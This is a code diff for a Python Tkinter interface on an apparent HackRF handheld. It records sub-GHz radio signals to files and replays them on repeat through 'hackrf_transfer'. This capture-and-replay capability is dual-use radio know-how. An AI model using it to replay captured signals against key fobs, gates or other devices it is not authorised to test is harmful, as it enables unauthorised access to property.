-        message_label = tk.Label(content_frame, text=f"Listening on {freq} MHz", bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
-        message_label.grid(row=1, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
+    execute_button = tk.Button(content_frame, text="Stop Capturing. Terminate.", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                           command=lambda: stop_capturing(execute_button))
+    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
 
-        # Back button
-        return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=sub_ghz_page)
-        return_button.grid(row=2, column=0, columnspan=3, pady=10, sticky='nsew')
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: stop_capturing(back_button))
+    back_button.grid(row=3, column=0, padx=10, pady=10, sticky='nsew')
 
-        thread = threading.Thread(target=receive_signal, args=(create_file(freq), int(float(freq) * 1000000), 2000000, 16, 14))
-        thread.start()    
-    else:
-        messagebox.showerror("Error", "Frequency entry not found")
+    thread = threading.Thread(target=receive_signal, args=(create_file(freq), int(float(freq) * 1000000), 2000000, 16, 14))
+    thread.start()  
+
+
+def receive_signal(output_file, frequency, sample_rate, if_gain, gain, timeout=None):
+    global capturing_process
+    command = [
+        'hackrf_transfer',
+        '-r', output_file,
+        '-f', str(frequency),
+        '-s', str(sample_rate),
+        '-l', str(if_gain),
+        '-g', str(gain)
+    ]
+    try:
+        capturing_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except Exception:
+        pass
+
+def stop_capturing(execute_button):
+    global capturing_process, transmitting_process
+    if capturing_process:
+        capturing_process.terminate()  # This sends SIGTERM, you could
+        capturing_process.wait()
+        capturing_process = None
+    if transmitting_process:
+        transmitting_process.terminate()
+        transmitting_process.wait()
+        transmitting_process = None
+
+    execute_button.config(text='Stopped. Press to go to back', command=sub_ghz_page)
+#check if there is a freq
 
 def transmit_sub_ghz():
     # Page and Font Setup
     new_frame(content_frame)
-    weight_setup(4, 3)
-    unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
+    weight_setup(5, 3)
+    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
+    unified_choice_font = tkFont.Font(family="Helvetica", size=10, weight="bold")
     unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")
 
     # Title label
@@ -495,7 +686,7 @@ def transmit_sub_ghz():
     title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
 
     # List signals from directory and create buttons
-    directory = "/home/kali/signals/"
+    directory = "/device/subghz/signals"
     files = [f for f in os.listdir(directory) if f.endswith('.complex16s')]
     files.sort()
 
@@ -505,14 +696,83 @@ def transmit_sub_ghz():
         freq = filename.split('_')[2].replace('.complex16s', '')
 
         # Button to transmit signal
-        btn = tk.Button(content_frame, text=filename, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
-                        command=lambda fp=file_path, fr=freq: threading.Thread(
-                            target=transmit_signal, args=(fp, int(float(fr) * 1000000), 2000000, 1, 23)).start())
+        btn = tk.Button(content_frame, text=filename, font=unified_choice_font, bg=unified_bg_color, fg=unified_fg_color,
+                        command=lambda fp=file_path, fr=freq, fn=filename: transmitting_page(fp, fr, fn))
         btn.grid(row=1 + index // 3, column=index % 3, padx=5, pady=5, sticky="nsew")
 
     # Back button
     return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=sub_ghz_page)
     return_button.grid(row=4, column=0, columnspan=3, pady=10, sticky='nsew')
+
+def transmitting_page(fp, fr, fn):
+    new_frame(content_frame)
+    weight_setup(4,1)  # Five rows, three columns for the number pad and other controls
+    global freq_entry
+
+    
+    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
+    unified_title_font = tkFont.Font(family="Helvetica", size=30, weight="bold")
+    
+    title_label = tk.Label(content_frame, text="Transmit an RF Signal", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color)
+    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
+    
+    info_label = tk.Label(content_frame, text=f"Transmitting {fn} on {fr}...", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
+    info_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
+
+    execute_button = tk.Button(content_frame, text="Stop Transmitting. Terminate.", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                           command=lambda: stop_capturing(execute_button))
+    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
+
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: stop_capturing(back_button))
+    back_button.grid(row=3, column=0, padx=10, pady=10, sticky='nsew')
+
+    thread = threading.Thread(target=transmit_signal, args=(fp, int(float(fr) * 1000000), 2000000, 1, 23))
+    thread.start()
+
+def transmit_signal(input_file, frequency, sample_rate, antenna_gain, tx_gain):
+    global transmitting_process
+    command = [
+        'hackrf_transfer',
+        '-t', input_file,
+        '-f', str(frequency),
+        '-s', str(sample_rate),
+        '-a', str(antenna_gain),
+        '-x', str(tx_gain),
+        '-R'
+    ]
+    try:
+        transmitting_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except Exception:
+        pass
+
+def add_to_freq(char):
+    global freq_entry
+    freq_entry.insert(tk.END, char)
+
+def clear_freq():
+    global freq_entry
+    freq_entry.delete(0, tk.END)
+
+def new_frame(frame):
+    # Clears all widgets from the given frame
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+
+def create_file(freq):
+    directory = "/device/subghz/signals"
+    max_files = 9
+    for num in range(1, max_files + 1):
+        filename = f"Signal_{num}_{freq}.complex16s"
+        filepath = os.path.join(directory, filename)
+        # If file does not exist, or we're cycling back to start overwriting
+        if not os.path.exists(filepath) or num == max_files:
+            return filepath
+    # If all files exist and max is reached, start overwriting from the first file
+    return os.path.join(directory, f"Signal_1_{freq}.complex16s")
+
+
+
 
 
 
